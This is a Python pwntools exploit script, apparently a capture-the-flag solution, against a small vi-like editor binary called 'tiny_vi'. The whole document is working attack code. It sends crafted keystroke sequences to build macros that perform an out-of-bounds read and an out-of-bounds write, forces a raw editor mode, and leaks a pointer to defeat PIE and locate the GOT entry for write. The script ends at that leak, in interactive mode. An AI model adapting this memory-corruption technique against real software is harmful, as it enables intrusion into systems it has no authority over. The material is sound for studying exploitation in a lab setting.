from pwn import *
context.log_level = "info"

elf = ELF("./bin/tiny_vi")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

p = elf.process(env={"LD_PRELOAD": libc.path})

CTRL_E = b"\x05"
CTRL_N = b"\x0E"
CTRL_O = b"\x0F"
CTRL_X = b"\x18"
CTRL_Y = b"\x19"
CTRL_P = b"\x10"
CTRL_F = b"\x06"
CTRL_G = b"\x07"
CTRL_3 = b"\x1B"
CTRL_5 = b"\x1D"
CTRL_6 = b"\x1E"
CTRL_7 = b"\x1F"

WIDHT = 80
HEIGHT = 24

def get_buf():
    buf = []

    for i in range(HEIGHT):
        p.recvuntil(b"\x1b[K") # clear_line
        buf.append(p.recv(WIDHT))

    return buf

def move_cursor(x, y):
    payload = b""
    payload += b"h" * WIDHT
    payload += b"k" * HEIGHT
    payload += b"l" * x
    payload += b"j" * y
    return payload

get_buf()


#############################
### Stage 1: Set MODE_RAW ###
#############################

# Set clipboard.len to 0x03
payload = b""
payload += CTRL_Y
payload += b"l" * 2
payload += CTRL_Y
payload += CTRL_Y
payload += b"l" * 2
payload += CTRL_Y
payload += CTRL_Y
payload += b"l" * 2
payload += CTRL_Y
payload += CTRL_Y
payload += b"l" * 2
payload += CTRL_Y
p.send(payload)
get_buf()

# Record macro for OOB Read
payload = b""
payload += move_cursor(0, 0)
payload += CTRL_F
payload += b"j" * 2
payload += b"l" * 8
payload += CTRL_Y
payload += CTRL_Y
payload += CTRL_F
p.send(payload)
get_buf()

# Get 0x03 from clipboard.len
payload = b""
payload += move_cursor(0, HEIGHT)
payload += CTRL_G
p.send(payload)
get_buf()

# Record macro for OOB Write
payload = b""
payload += move_cursor(0, 0)
payload += CTRL_F
payload += b"j" * 2
payload += b"l" * 26
payload += CTRL_P
payload += b"k" * 2
payload += b"h" * 28
payload += CTRL_F
p.send(payload)
get_buf()

# Set current_mode to 0x03 (MODE_RAW(0x1) | MODE_NORMAL(0x2)) 
payload = b""
payload += move_cursor(0, HEIGHT)
payload += CTRL_G
p.send(payload)
get_buf()


###########################
### Stage 2: PIE Bypass ###
###########################

# Record macro for PIE bypass
payload = b""
payload += move_cursor(0, 0)
payload += CTRL_Y
payload += CTRL_F
payload += CTRL_Y
payload += CTRL_P
payload += CTRL_F
p.send(payload)
get_buf()

# Print current pointer
payload = b""
payload += move_cursor(0, 0)
payload += CTRL_G
payload += CTRL_Y
p.send(payload)
buf = get_buf()

binary_buf = u64(buf[0][:6] + b"\0\0")
binary_base = binary_buf - 0x6020
write_got = binary_base + elf.got["write"]

print()
log.info(f"binary_base @ {binary_base:#x}")
log.info(f"binary_buf @ {binary_buf:#x}")
log.info(f"write_got @ {write_got:#x}")
print()

p.interactive()
p.close()
